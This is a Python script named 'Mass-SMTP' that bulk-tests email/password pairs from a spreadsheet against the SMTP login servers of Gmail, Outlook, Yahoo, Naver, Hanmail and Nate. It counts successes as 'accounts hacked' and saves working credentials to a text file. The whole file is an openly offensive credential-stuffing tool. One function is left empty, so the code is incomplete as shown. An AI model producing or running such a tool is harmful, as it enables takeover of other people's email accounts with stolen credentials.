import smtplib
import xlrd, sys

print ('    __  ___                     _____ __  _____________  ')
print ('   /  |/  /___ ___________     / ___//  |/  /_  __/ __ \ ')
print ('  / /|_/ / __ `/ ___/ ___/_____\__ \/ /|_/ / / / / /_/ / ')
print (' / /  / / /_/ (__  |__  )_____/__/ / /  / / / / / ____/  ')
print ('/_/  /_/\__,_/____/____/     /____/_/  /_/ /_/ /_/       ')
print ('                                            by Skellyton ')



                                                        
Accountshacked = 0
Failedhacks = 0
Totalattempts = 0
row = 0
#credentails & SMTP info
user = ''
password = ''
server = ''
port = ''
#creates account file
Account_file = open('Accounts.txt', 'w')
Account_file.close()

#Check version
def checkversion():
    if sys.version_info >= (3,5):
        print ("Version ok")
        return
    else:
        print ("Update your python")
        input ("PRESS ENTER TO CONTINUE.")
        exit()

#takes row from spreadsheet
def user_password(row):
    print ("Grabbing Username and Password from spreadsheet")
    book = xlrd.open_workbook('Test_accounts.xlsx')
    first_sheet = book.sheet_by_index(0)
    row = first_sheet.row_values(row)
    row.pop(1)
    print ("OK.")
    return row

#splits serverlist and return server, port via list
def List_smtp_port(SMTP):
    string = SMTP #'Server:Port'
    port = string.split(":")[1]
    server = string.split(":")[0]
    SMTPserver = [server, port]
    print (SMTPserver)
    return SMTPserver

#tests the credentials
def Login_test(user, password, server, port):
    print ('Connecting....')
    connection = smtplib.SMTP(server, port)
    connection.ehlo()
    connection.starttls()
    print ('Connected')
    print ('Attempting to login')
    try:
        connection.login(user, password)
        
    except smtplib.SMTPAuthenticationError:
        print ("Username or Password inccorect")
        return False
    
    except smtplib.SMTPServerDisconnected:
        print ("Server closed")
        return False
    
    connection.close()
    print ("Username and password correct!")
    return True

#finds correct smtp server
def SMTP_SERVER(user):
    #List of SMTP servers as 'server:port'
    serverlist = ['smtp.gmail.com:587','smtp.hanmail.net:465', 'smtp.naver.com:587', 'smtp-mail.outlook.com:587', 'smtp.mail.yahoo.com:465', 'smtp.mail.nate.com:465']

    if "gmail" in user:
        print ("Identifed as a Gmail account.")
        server = serverlist[0]
        server = List_smtp_port(server)
        return server
    
    elif "hanmail" in user:
        print ("Identifed as a Hanmail account.")
        server = serverlist[1]
        server = List_smtp_port(server)
        return server

    elif "daum" in user:
        print ("Identifed as a Hanmail account.")
        server = serverlist[1]
        server = List_smtp_port(server)
        return server
    
    elif "naver" in user:
        print ("Identifed as a Naver account.")
        server = serverlist[2]
        server = List_smtp_port(server)
        return server
    
    elif "hotmail" in user:
        print ("Identifed as a Hotmail account.")
        server = serverlist[3]
        server = List_smtp_port(server)
        return server
    
    elif "outlook" in user:
        print ("Identifed as a Hotmail account.")
        server = serverlist[3]
        server = List_smtp_port(server)
        return server
    
    elif "yahoo" in user:
        print ("Identifed as a Yahoo account.")
        server = serverlist[4]
        server = List_smtp_port(server)
        return server
    
    elif "nate" in user:
        print ("Identifed as a Nate account.")
        server = serverlist[5]
        server = List_smtp_port(server)
        return server
        
    else:
        print ('Email not supported \n')
        return 'error'

def gmail_website(user, password):
    
       

checkversion()
attempts = int(input("How many accounts: "))

while row <= (attempts - 1):
    credentials = user_password(row)
    row = row + 1
    user = str(credentials[0])
    password = str(credentials[1])
    user = user.lower()
    print (user)
    server = SMTP_SERVER(user)
    if server == 'error':
        continue
    port = server[1]
    server = server[0]
    
    attempt = Login_test(user, password, server, port)

    if attempt == True:
        #logs hacked email
        print ("Account Hacked: " + user)
        Accountshacked = Accountshacked + 1
        Totalattempts = Totalattempts + 1
        print ("Number of accounts hacked: " + str(Accountshacked))
        print ("Number of Hack attempts: " + str(Totalattempts))
        print ("Number of failed hacks: " + str(Failedhacks) + "\n")
        #Adds hacked email to text file
        Account_file = open('Accounts.txt', 'a')
        Account_file.write (user + " - - " + password + "\n")
        Account_file.close()
    else:
        print ("Hack failed")
        Failedhacks = Failedhacks + 1
        Totalattempts = Totalattempts + 1
        print ("Number of accounts hacked: " + str(Accountshacked))
        print ("Number of Hack attempts: " + str(Totalattempts))
        print ("Number of failed hacks: " + str(Failedhacks) + "\n")


## NOTES

    ##daum & hanmail are the same smtp - smtp.hanmail.net:465
    ##gmail and hotmail tested working.
